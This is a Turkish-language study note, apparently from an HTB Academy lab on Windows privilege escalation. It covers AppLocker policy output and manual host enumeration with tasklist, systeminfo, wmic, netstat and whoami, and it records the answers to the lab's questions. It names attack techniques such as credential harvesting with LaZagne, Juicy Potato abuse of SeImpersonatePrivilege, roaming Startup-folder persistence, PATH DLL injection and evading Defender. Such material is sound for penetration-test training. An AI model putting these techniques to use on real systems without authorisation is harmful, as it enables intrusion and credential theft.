PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name                : (Default Rule) All scripts located in the Windows folder
Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : ed97d0cb-15ff-430f-b82c-8d7832957725
Name                : (Default Rule) All scripts
Description         : Allows members of the local Administrators group to run all scripts.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow
```

Bu çıktı, AppLocker tarafından yapılandırılmış olan kuralları gösteriyor. Bu kurallar, hangi kullanıcı veya kullanıcı gruplarının belirli uygulamaları, paketlenmiş uygulamaları, Windows Installer dosyalarını ve komut dosyalarını çalıştırabileceğini belirlemek için kullanılır. Şimdi her bir kuralı inceleyelim:

### Genel Yapı

Her kural aşağıdaki bileşenleri içerir:

- **Id**: Kuralın benzersiz kimliği.
- **Name**: Kuralın adı.
- **Description**: Kuralın açıklaması.
- **UserOrGroupSid**: Kuralın hangi kullanıcı veya gruba uygulandığını belirten SID (Güvenlik Tanımlayıcısı).
- **Action**: Kuralın etkisi (`Allow` - izin ver, `Deny` - reddet).
- **PathConditions / PublisherConditions**: Dosya yoluna veya yayımcı bilgisine göre kuralın uygulanacağı koşullar.

### Kuralların Açıklaması

1. **All signed packaged apps**:
    
    - **Açıklama**: İmzalı paketlenmiş uygulamaların (UWP gibi) `Everyone` grubu tarafından çalıştırılmasına izin verir.
    - **UserOrGroupSid**: `S-1-1-0` (`Everyone` grubu).
    - **Action**: `Allow`.
2. **All files located in the Program Files folder**:
    
    - **Açıklama**: `Program Files` klasöründe bulunan uygulamaların `Everyone` grubu tarafından çalıştırılmasına izin verir.
    - **UserOrGroupSid**: `S-1-1-0`.
    - **Action**: `Allow`.
3. **All files located in the Windows folder**:
    
    - **Açıklama**: `Windows` klasöründe bulunan uygulamaların `Everyone` grubu tarafından çalıştırılmasına izin verir.
    - **UserOrGroupSid**: `S-1-1-0`.
    - **Action**: `Allow`.
4. **All files**:
    
    - **Açıklama**: `Administrators` grubunun tüm uygulamaları çalıştırmasına izin verir.
    - **UserOrGroupSid**: `S-1-5-32-544` (`Administrators` grubu).
    - **Action**: `Allow`.
5. **All digitally signed Windows Installer files**:
    
    - **Açıklama**: İmzalı Windows Installer dosyalarının `Everyone` grubu tarafından çalıştırılmasına izin verir.
    - **UserOrGroupSid**: `S-1-1-0`.
    - **Action**: `Allow`.
6. **All Windows Installer files in %systemdrive%\Windows\Installer**:
    
    - **Açıklama**: `%systemdrive%\Windows\Installer` konumundaki Windows Installer dosyalarının `Everyone` grubu tarafından çalıştırılmasına izin verir.
    - **UserOrGroupSid**: `S-1-1-0`.
    - **Action**: `Allow`.
7. **All Windows Installer files**:
    
    - **Açıklama**: `Administrators` grubunun tüm Windows Installer dosyalarını çalıştırmasına izin verir.
    - **UserOrGroupSid**: `S-1-5-32-544`.
    - **Action**: `Allow`.
8. **All scripts located in the Program Files folder**:
    
    - **Açıklama**: `Program Files` klasöründe bulunan komut dosyalarının `Everyone` grubu tarafından çalıştırılmasına izin verir.
    - **UserOrGroupSid**: `S-1-1-0`.
    - **Action**: `Allow`.
9. **All scripts located in the Windows folder**:
    
    - **Açıklama**: `Windows` klasöründe bulunan komut dosyalarının `Everyone` grubu tarafından çalıştırılmasına izin verir.
    - **UserOrGroupSid**: `S-1-1-0`.
    - **Action**: `Allow`.
10. **All scripts**:
    
    - **Açıklama**: `Administrators` grubunun tüm komut dosyalarını çalıştırmasına izin verir.
    - **UserOrGroupSid**: `S-1-5-32-544`.
    - **Action**: `Allow`.

### Özet

Bu AppLocker politikası, genellikle `Everyone` grubuna `Program Files` ve `Windows` klasöründeki uygulamaları, komut dosyalarını ve imzalı Windows Installer dosyalarını çalıştırma izni verirken, `Administrators` grubuna her türlü dosyayı veya komut dosyasını çalıştırma izni vermektedir. Bu kurallar, güvenlik amacıyla belirli dosya türlerinin veya konumlarının sadece belirli kullanıcı grupları tarafından çalıştırılabilmesini sağlamak için yapılandırılmıştır.





#### Test AppLocker Policy
```powershell-session
PS C:\htb> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

FilePath                    PolicyDecision MatchingRule
--------                    -------------- ------------
C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe
```

Bu PowerShell komutu, **AppLocker**'ın mevcut politika ayarlarına göre belirli bir dosyanın (bu durumda `cmd.exe`'nin) belirtilen kullanıcı (`Everyone`) tarafından çalıştırılmasına izin verilip verilmediğini test ediyor.

Komutun parçalarını inceleyelim:

1. **`Get-AppLockerPolicy -Local`**: Bu kısım, yerel olarak yapılandırılmış AppLocker politikasını alır.
2. **`| Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User Everyone`**: Bu politika üzerinde `cmd.exe` dosyasının `Everyone` kullanıcı grubu tarafından çalıştırılma iznini test eder.

Çıktının açıklaması:

- **`FilePath`**: Test edilen dosyanın yolu (`C:\Windows\System32\cmd.exe`).
- **`PolicyDecision`**: Bu, AppLocker politikasının dosya için verdiği karar. Çıktıda **`Denied`** olarak belirtilmiş, yani AppLocker, `cmd.exe` dosyasının çalıştırılmasını engelliyor.
- **`MatchingRule`**: Engelleme kararının hangi kural tarafından tetiklendiğini gösterir. Burada `C:\Windows\System32\cmd.exe` dosyasına özgü bir kural `Denied` kararı vermiş.

**Sonuç olarak**, bu komut çıktısı, yerel AppLocker politikasının `cmd.exe` dosyasının `Everyone` grubu tarafından çalıştırılmasını yasakladığını belirtmektedir.

## **Sonraki Adımlar**  

Artık host hakkında ağ bilgilerini topladığımıza ve mevcut korumaları listelediğimize göre, sonraki numaralandırma aşamalarında hangi araçları veya manuel teknikleri kullanacağımıza ve ağ içindeki olası ek saldırı yollarına karar verebiliriz.

Soru 1 : Hedef host'a bağlı diğer NIC'nin IP adresi nedir?
Cevap  : 172.16.20.45

1- Hedef Sisteme rdp ile bağlanınca 2 tane ethernet ağı var 
![Pasted image 20241111025335.png](/img/user/resimler/Pasted%20image%2020241111025335.png)
![Pasted image 20241111025351.png](/img/user/resimler/Pasted%20image%2020241111025351.png)

Soru : AppLocker tarafından cmd.exe dışında hangi yürütülebilir dosya engelleniyor?
Cevap : powershell_ise.exe

![Pasted image 20241111025830.png](/img/user/resimler/Pasted%20image%2020241111025830.png)


# **İlk Numaralandırma**  

Bir değerlendirme sırasında, bir Windows host'unda ( domain'e bağlı olsun ya da olmasın) düşük ayrıcalıklı bir shell elde edebiliriz ve erişimimizi ilerletmek için ayrıcalık yükseltmesi yapmamız gerekebilir. Hostun tamamen ele geçirilmesi bize hassas dosyalara/dosya paylaşımlarına erişim sağlayabilir, daha fazla kimlik bilgisi elde etmek için trafiği yakalama olanağı verebilir veya erişimimizi ilerletmemize yardımcı olabilecek kimlik bilgilerini elde edebilir ve hatta bir Active Directory ortamında doğrudan Domain Admin'e yükselmemizi sağlayabilir. Sistem yapılandırmasına ve ne tür verilerle karşılaştığımıza bağlı olarak ayrıcalıkları aşağıdakilerden birine yükseltebiliriz:

  

1. **NT AUTHORITY\SYSTEM or [LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account) Account**:
    
    - Bu hesap, Windows sisteminde en yüksek yetkiye sahip hesaptır ve genellikle kritik Windows servislerini çalıştırmak için kullanılır.
    - **LocalSystem** account, standart bir administrator account'tan bile daha fazla yetkiye sahiptir ve işletim sistemi üzerinde tam kontrole sahiptir.
2. **Built-in Local Administrator Account**:
    
    - Bu, Windows tarafından varsayılan olarak oluşturulan administrator account'tur. Bazı organizasyonlar bu hesabı güvenlik nedeniyle devre dışı bıraksa da, birçok organizasyonda aktif olarak kullanılmaktadır.
    - Bu hesabın birden fazla makinede yeniden kullanıldığını görmek yaygındır; yani aynı kimlik bilgilerine sahip olabilir.
3. **Another Local Account in the Administrators Group**:
    
    - Bu, **Administrators** group üyesi olan farklı bir local user account'u ifade eder.
    - Bu gruba üye olan herhangi bir hesap, built-in administrator account ile aynı yetkilere sahip olacaktır.
4. **A Standard Domain User in the Local Administrators Group**:
    
    - Bu, genellikle sınırlı yetkilere sahip olan bir domain user account'tur; ancak belirli bir sistemde **Administrators** group üyesi olduğu için o makinede tam yetkilere sahiptir.
5. **Domain Admin Account**:
    
    - **Domain Admin** account, bir Active Directory (AD) ortamında yüksek yetkilere sahip bir hesaptır ve genellikle tüm domain üzerindeki sistemlerde yönetici haklarına sahiptir.
    - Eğer bir domain admin, local **Administrators** group üyesiyse, o makine üzerinde de tam kontrole sahip olacaktır.

Numaralandırma, ayrıcalık yükseltmenin anahtarıdır. Host'a ilk shell erişimini elde ettiğimizde, durumsal farkındalık kazanmak ve işletim sistemi sürümü, yama seviyesi, yüklü yazılım, mevcut ayrıcalıklar, grup üyelikleri ve daha fazlasıyla ilgili ayrıntıları ortaya çıkarmak hayati önem taşır. İlk erişimi sağladıktan sonra gözden geçirmemiz gereken bazı önemli veri noktalarını inceleyelim. Bu hiçbir şekilde kapsamlı bir liste değildir ve önceki bölümde ele aldığımız çeşitli numaralandırma komut dosyaları/araçları tüm bu veri noktalarını ve çok daha fazlasını kapsamaktadır. Bununla birlikte, özellikle kendimizi ağ kısıtlamaları, internet erişimi eksikliği veya yürürlükteki korumalar nedeniyle araçları yükleyemediğimiz bir ortamda bulursak, bu görevlerin manuel olarak nasıl gerçekleştirileceğini anlamak çok önemlidir.  

Bu [Windows komutları referansı](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands), manuel numaralandırma görevlerini gerçekleştirmek için çok kullanışlıdır.


## Key Data Points

`OS name`: Windows OS türünü ( workstation veya server) ve seviyesini (Windows 7 veya 10, Server 2008, 2012, 2016, 2019, vb.) bilmek bize mevcut olabilecek araç türleri hakkında bir fikir verecektir ( `PowerShell` sürümü veya eski sistemlerdeki eksikliği gibi. Bu aynı zamanda halka açık istismarların mevcut olabileceği işletim sistemi sürümünü de belirleyecektir.  

`Versiyon`: İşletim sistemi [sürümünde](https://en.wikipedia.org/wiki/Comparison_of_Microsoft_Windows_versions) olduğu gibi, Windows'un belirli bir sürümündeki bir güvenlik açığını hedef alan genel istismarlar olabilir. Windows sistem açıkları sistem kararsızlığına ve hatta tamamen çökmesine neden olabilir. Bunları herhangi bir üretim sistemine karşı çalıştırırken dikkatli olun ve bir tanesini çalıştırmadan önce istismarı ve olası sonuçlarını tam olarak anladığınızdan emin olun.  

`Çalışan Servisler (Running Services)`: Host üzerinde hangi hizmetlerin çalıştığını bilmek önemlidir, özellikle de `NT AUTHORITY\SYSTEM` veya yönetici düzeyinde bir hesap olarak çalışanlar. Ayrıcalıklı bir hesap bağlamında çalışan yanlış yapılandırılmış veya savunmasız bir hizmet, ayrıcalık yükseltme için kolay bir kazanç olabilir.  

Şimdi daha derinlemesine bir göz atalım.



## **System Information**  

Sistemin kendisine bakmak bize tam işletim sistemi sürümü, kullanılan donanım, yüklü programlar ve güvenlik güncellemeleri hakkında daha iyi bir fikir verecektir. Bu, ayrıcalıkları artırmak için kullanabileceğimiz eksik yamalar ve ilişkili CVE'ler için avımızı daraltmamıza yardımcı olacaktır. Çalışan proseslere bakmak için [tasklist](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist) komutunu kullanmak, sistemde şu anda hangi uygulamaların çalıştığı hakkında bize daha iyi bir fikir verecektir.

#### Tasklist
```cmd-session
C:\htb> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
smss.exe                       316 N/A
csrss.exe                      424 N/A
wininit.exe                    528 N/A
csrss.exe                      540 N/A
winlogon.exe                   612 N/A
services.exe                   664 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 BrokerInfrastructure, DcomLaunch, LSM,
                                   PlugPlay, Power, SystemEventsBroker
svchost.exe                    836 RpcEptMapper, RpcSs
LogonUI.exe                    952 N/A
dwm.exe                        964 N/A
svchost.exe                    972 TermService
svchost.exe                   1008 Dhcp, EventLog, lmhosts, TimeBrokerSvc
svchost.exe                    364 NcbService, PcaSvc, ScDeviceEnum, TrkWks,
                                   UALSVC, UmRdpService
<...SNIP...>

svchost.exe                   1468 Wcmsvc
svchost.exe                   1804 PolicyAgent
spoolsv.exe                   1884 Spooler
svchost.exe                   1988 W3SVC, WAS
svchost.exe                   1996 ftpsvc
svchost.exe                   2004 AppHostSvc
FileZilla Server.exe          1140 FileZilla Server
inetinfo.exe                  1164 IISADMIN
svchost.exe                   1736 DiagTrack
svchost.exe                   2084 StateRepository, tiledatamodelsvc
VGAuthService.exe             2100 VGAuthService
vmtoolsd.exe                  2112 VMTools
MsMpEng.exe                   2136 WinDefend

<...SNIP...>

FileZilla Server Interfac     5628 N/A
jusched.exe                   5796 N/A
cmd.exe                       4132 N/A
conhost.exe                   4136 N/A
TrustedInstaller.exe          1120 TrustedInstaller
TiWorker.exe                  1816 N/A
WmiApSrv.exe                  2428 wmiApSrv
tasklist.exe                  3596 N/A
```

[Session Manager Subsystem (smss.exe)](https://en.wikipedia.org/wiki/Session_Manager_Subsystem), [Client Server Runtime Subsystem (csrss.exe)](https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem), [WinLogon (winlogon. exe)](https://en.wikipedia.org/wiki/Winlogon), [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) ve[ Service Host (svchost.exe)](https://en.wikipedia.org/wiki/Svchost.exe) gibi standart Windows prosesleri ve bunlarla ilişkili servisler hakkında bilgi sahibi olmak önemlidir. Standart prosesleri/hizmetleri hızlı bir şekilde tespit edebilmek, numaralandırma işlemimizi hızlandırmaya yardımcı olacak ve ayrıcalık yükseltme yolunu açabilecek standart olmayan proseslere/hizmetlere odaklanmamızı sağlayacaktır. Yukarıdaki örnekte, en çok `FileZilla` FTP sunucusunun çalışmasıyla ilgileneceğiz ve hassas verilerin açığa çıkmasına veya daha fazlasına yol açabilecek FTP anonim erişimi gibi genel güvenlik açıklarını veya yanlış yapılandırmaları aramak için sürümü numaralandırmaya çalışacağız.  

`MsMpEng.exe`, Windows Defender gibi diğer prosesler de ilgi çekicidir çünkü hedef hostta kaçmak/atlamak zorunda kalabileceğimiz hangi korumaların mevcut olduğunu belirlememize yardımcı olabilirler.

#### **Tüm Ortam Değişkenlerini Göster**  

Ortam değişkenleri host yapılandırması hakkında çok şey açıklar. Bunların bir çıktısını almak için Windows `set` komutunu sağlar. En çok gözden kaçan değişkenlerden biri `PATH`. Aşağıdaki çıktıda sıra dışı bir şey yoktur. Ancak, yöneticilerin (veya uygulamaların) `PATH`'i değiştirdiğini görmek nadir değildir. Yaygın bir örnek, Python veya Java'yı yola yerleştirmektir, bu da Python veya . JAR dosyalarının çalıştırılmasına izin verir. PATH'e yerleştirilen klasör kullanıcınız tarafından yazılabilirse, diğer uygulamalara karşı DLL Enjeksiyonları gerçekleştirmek mümkün olabilir. Unutmayın, bir programı çalıştırırken, Windows o programı önce CWD'de ( Current Working Directory), ardından soldan sağa doğru PATH'de arar. Bu, özel yolun solda (C:\Windows\System32'den önce) yer alması durumunda, sağda yer almasından çok daha tehlikeli olduğu anlamına gelir.

PATH'e ek olarak, `set` HOME DRIVE gibi diğer yararlı bilgileri de verebilir. İşletmelerde bu genellikle bir dosya paylaşımı olacaktır. Dosya paylaşımının kendisine gitmek, erişilebilecek diğer dizinleri ortaya çıkarabilir. Şifreleri de içeren bir envanter tablosunu içeren bir " IT Directory" ye erişebilmek duyulmamış bir şey değildir. Ayrıca, paylaşımlar home dizinleri için kullanılır, böylece kullanıcı diğer bilgisayarlarda oturum açabilir ve aynı deneyime/dosyalara/masaüstüne/vb. sahip olabilir ([Roaming Profiles](https://docs.microsoft.com/en-us/windows-server/storage/folder-redirection/folder-redirection-rup-overview)). Bu aynı zamanda kullanıcının kötü amaçlı öğeleri yanında götürdüğü anlamına da gelebilir. `USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup` içine bir dosya yerleştirilirse, kullanıcı farklı bir makinede oturum açtığında bu dosya çalıştırılır.

```cmd-session
C:\htb> set

ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\Administrator\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=WINLPE-SRV01
ComSpec=C:\Windows\system32\cmd.exe
HOMEDRIVE=C:
HOMEPATH=\Users\Administrator
LOCALAPPDATA=C:\Users\Administrator\AppData\Local
LOGONSERVER=\\WINLPE-SRV01
NUMBER_OF_PROCESSORS=6
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
PROCESSOR_LEVEL=23
PROCESSOR_REVISION=3100
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC=C:\Users\Public
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
TMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
USERDOMAIN=WINLPE-SRV01
USERDOMAIN_ROAMINGPROFILE=WINLPE-SRV01
USERNAME=Administrator
USERPROFILE=C:\Users\Administrator
windir=C:\Windows 
```

#### **Ayrıntılı Yapılandırma Bilgilerini Görüntüleme**  

`Systeminfo` komutu, kutunun yakın zamanda yamalanıp yamalanmadığını ve bir VM olup olmadığını gösterecektir. Kutu yakın zamanda yamalanmadıysa, yönetici düzeyinde erişim elde etmek bilinen bir istismarı çalıştırmak kadar basit olabilir. Kutunun ne zaman yamalandığına dair bir fikir edinmek için [HotFixes](https://www.catalog.update.microsoft.com/Search.aspx?q=hotfix) altında yüklü KB'leri Google'da arayın. Düzeltme yazılımlarını yönetici olmayanlardan gizlemek mümkün olduğundan bu bilgi her zaman mevcut değildir. Yama seviyesi hakkında bir fikir edinmek için `System Boot Time` ve `OS Version` da kontrol edilebilir. ==Kutu altı aydan uzun bir süredir yeniden başlatılmadıysa, büyük olasılıkla yaması da yapılmamıştır.==

Buna ek olarak, birçok kılavuz Network Information'ın (Ağ Bilgileri) çift ağa bağlı (birden fazla ağa bağlı) bir makineyi gösterebileceği için önemli olduğunu söyleyecektir. Genel olarak, işletmeler söz konusu olduğunda, cihazlara sadece bir güvenlik duvarı kuralı aracılığıyla diğer ağlara erişim izni verilir ve onlara fiziksel bir kablo döşenmez.

```cmd-session
C:\htb> systeminfo

Host Name:                 WINLPE-SRV01
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00376-30000-00299-AA303
Original Install Date:     3/24/2021, 3:46:32 PM
System Boot Time:          3/25/2021, 9:24:36 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              3 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [03]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     6,143 MB
Available Physical Memory: 3,474 MB
Virtual Memory: Max Size:  10,371 MB
Virtual Memory: Available: 7,544 MB
Virtual Memory: In Use:    2,827 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WINLPE-SRV01
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB5001078
                           [03]: KB4103723
Network Card(s):           2 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.43.8
                                 [02]: fe80::e4db:5ea3:2775:8d4d
                                 [03]: dead:beef::e4db:5ea3:2775:8d4d
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.20.56
                                 [02]: fe80::f055:fefd:b1b:9919
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```


#### Patches and Updates
Eğer `systeminfo` düzeltmeleri göstermiyorsa, yamaları görüntülemek için [QFE (Quick Fix Engineering)](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering)) ile [WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) binary kullanılarak WMI ile sorgulanabilirler.

```cmd-session
C:\htb> wmic qfe

Caption                                     CSName        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=3199986  WINLPE-SRV01  Update                        KB3199986               NT AUTHORITY\SYSTEM  11/21/2016
https://support.microsoft.com/help/5001078  WINLPE-SRV01  Security Update               KB5001078               NT AUTHORITY\SYSTEM  3/25/2021
http://support.microsoft.com/?kbid=4103723  WINLPE-SRV01  Security Update               KB4103723               NT AUTHORITY\SYSTEM  3/25/2021
```

Bunu [Get-Hotfix](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-hotfix?view=powershell-7.1) cmdlet'ini kullanarak PowerShell ile de yapabiliriz.

```powershell-session
PS C:\htb> Get-HotFix | ft -AutoSize

Source       Description     HotFixID  InstalledBy                InstalledOn
------       -----------     --------  -----------                -----------
WINLPE-SRV01 Update          KB3199986 NT AUTHORITY\SYSTEM        11/21/2016 12:00:00 AM
WINLPE-SRV01 Update          KB4054590 WINLPE-SRV01\Administrator 3/30/2021 12:00:00 AM
WINLPE-SRV01 Security Update KB5001078 NT AUTHORITY\SYSTEM        3/25/2021 12:00:00 AM
WINLPE-SRV01 Security Update KB3200970 WINLPE-SRV01\Administrator 4/13/2021 12:00:00 AM
```

#### **Yüklü Programlar**  

WMI, yüklü yazılımları görüntülemek için de kullanılabilir. Bu bilgi genellikle bizi bulunması zor açıklara yönlendirebilir. `FileZilla/Putty`/etc yüklü mü? Bu uygulamalar için saklanan kimlik bilgilerinin yüklü olup olmadığını kontrol etmek için `LaZagne` 'yi çalıştırın. Ayrıca, bazı programlar yüklenmiş ve savunmasız bir hizmet olarak çalışıyor olabilir.

```cmd-session
C:\htb> wmic product get name

Name
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127
Java 8 Update 231 (64-bit)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
Java Auto Updater

<SNIP>
```

Elbette bunu [Get-WmiObject](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1) cmdlet'ini kullanarak PowerShell ile de yapabiliriz.

```powershell-session
PS C:\htb> Get-WmiObject -Class Win32_Product |  select Name, Version

Name                                                                    Version
----                                                                    -------
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
Microsoft OLE DB Driver for SQL Server                                  18.3.0.0
Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219             10.0.40219
Microsoft Help Viewer 2.3                                               2.3.28107
Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219             10.0.40219
Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.21005              12.0.21005
Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.21005           12.0.21005
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29914          14.28.29914
Microsoft ODBC Driver 13 for SQL Server                                 13.2.5026.0
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
SQL Server 2016 Database Engine Services                                13.2.5026.0
SQL Server Management Studio for Reporting Services                     15.0.18369.0
Microsoft SQL Server 2008 Setup Support Files                           10.3.5500.0
SSMS Post Install Tasks                                                 15.0.18369.0
Microsoft VSS Writer for SQL Server 2016                                13.2.5026.0
Java 8 Update 231 (64-bit)                                              8.0.2310.11
Browser for SQL Server 2016                                             13.2.5026.0
Integration Services                                                    15.0.2000.130

<SNIP>
```


#### **Çalışan Prosesleri Görüntüleme**  

Netstat komutu aktif TCP ve UDP bağlantılarını göstererek hem local hem de dışarıdan erişilebilen hangi port(lar)da hangi servislerin dinlendiğine dair bize daha iyi bir fikir verecektir. Yalnızca lokal host tarafından erişilebilen (hostta oturum açıldığında) ve ayrıcalıkları yükseltmek için kullanabileceğimiz savunmasız bir servis bulabiliriz.


#### Netstat
```cmd-session
PS C:\htb> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1096
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       840
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3520
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       968
<...SNIP...>
```


## User & Group Information
Kullanıcılar, özellikle sistemler iyi yapılandırılmış ve yamalanmışsa, genellikle bir kuruluştaki en zayıf halkadır. Sistemdeki kullanıcılar ve gruplar, bize yönetici düzeyinde erişim sağlayabilecek belirli grupların üyeleri, mevcut kullanıcımızın sahip olduğu ayrıcalıklar, parola ilkesi bilgileri ve hedefleyebileceğimiz oturum açmış kullanıcılar hakkında bilgi edinmek çok önemlidir. Sistemin iyi bir şekilde yamalanmış olduğunu görebiliriz, ancak local administrators grubunun bir üyesinin kullanıcı dizini taranabilir ve ==logins.xlsx== gibi bir parola dosyası içerir, bu da çok kolay bir kazanımla sonuçlanır.

#### **Oturum Açmış Kullanıcılar**  

Bir sistemde hangi kullanıcıların oturum açtığını belirlemek her zaman önemlidir. Boşta mı yoksa aktifler mi? Ne üzerinde çalıştıklarını belirleyebilir miyiz? Gerçekleştirmesi daha zor olsa da, bazen ayrıcalıkları yükseltmek veya daha fazla erişim elde etmek için kullanıcılara doğrudan saldırabiliriz. Kaçamak bir saldırı sırasında, tespit edilmekten kaçınmak için üzerinde aktif olarak çalışan başka kullanıcı(lar) bulunan bir host'a dikkatle yaklaşmamız gerekir.

```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#2           1  Active          .  3/25/2021 9:27 AM
```

### Current User (Güncel Kullanıcı)  

Bir host'a erişim sağladığımızda, her zaman önce hesabımızın hangi kullanıcı bağlamı altında çalıştığını kontrol etmeliyiz. Bazen, zaten SYSTEM veya eşdeğeriyizdir! Bir hizmet hesabı olarak erişim kazandığımızı varsayalım. Bu durumda, [Juicy Potato](https://github.com/ohpe/juicy-potato) gibi bir araç kullanarak ayrıcalıkları yükseltmek için kolayca kötüye kullanılabilen `SeImpersonatePrivilege` gibi ayrıcalıklara sahip olabiliriz.

```cmd-session
C:\htb> echo %USERNAME%

htb-student 
```


#### **Current User Privileges (Mevcut Kullanıcı Ayrıcalıkları)**

Daha önce de belirtildiği gibi, kullanıcımızın hangi ayrıcalıklara sahip olduğunu bilmek, ayrıcalıkların yükseltilmesine büyük ölçüde yardımcı olabilir. Bu modülün ilerleyen bölümlerinde bireysel kullanıcı ayrıcalıklarını ve yükseltme yollarını inceleyeceğiz.

```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```


#### **Güncel Kullanıcı Grubu Bilgileri**  

Kullanıcımız grup üyeliği yoluyla herhangi bir hakkı devraldı mı? Active Directory domain ortamında, daha fazla sisteme erişim sağlamak için kullanılabilecek ayrıcalıkları var mı?

```cmd-session
C:\htb> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
